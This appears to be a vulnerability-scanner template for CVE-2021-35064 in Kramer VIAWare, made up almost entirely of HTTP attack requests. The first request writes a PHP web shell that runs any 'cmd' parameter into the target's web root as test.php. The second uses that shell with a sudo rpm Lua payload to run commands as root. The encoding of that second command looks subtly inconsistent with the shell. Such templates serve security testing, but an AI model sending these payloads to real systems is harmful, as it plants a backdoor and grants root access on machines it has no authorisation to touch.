id: CVE-2021-35064

info:
  name: KramerAV VIAWare RCE via Misconfigured Sudo
  author: ProjectDiscoveryAI
  severity: critical
  description: KramerAV VIAWare, all tested versions, allow privilege escalation through misconfiguration of sudo. Sudoers permits running of multiple dangerous commands, including unzip, systemctl and dpkg.
  reference:
    - http://packetstormsecurity.com/files/166623/Kramer-VIAware-Remote-Code-Execution.html
    - https://www.kramerav.com/us/product/viaware
    - https://github.com/Chocapikk/CVE-2021-35064

http:
  - method: POST
    path:
      - "{{BaseURL}}/ajaxPages/writeBrowseFilePathAjax.php"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
      Accept: text/html, */*
      Accept-Language: en-GB,en;q=0.5
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
      X-Requested-With: XMLHttpRequest
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Sec-Gpc: 1
      Te: trailers
      Connection: close
    body: |
      radioBtnVal=<?php%0Aif(isset($_GET['cmd']))%0A{%0Asystem($_GET['cmd']);%0A}%0A&associateFileName=/var/www/html/test.php
    matchers:
      - type: word
        words:
          - "File written successfully"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/test.php?cmd={{base64('sudo rpm --eval \'%{lua:os.execute(\"id\")}\'')}}"
    matchers:
      - type: word
        words:
          - "uid=0(root)"
        part: body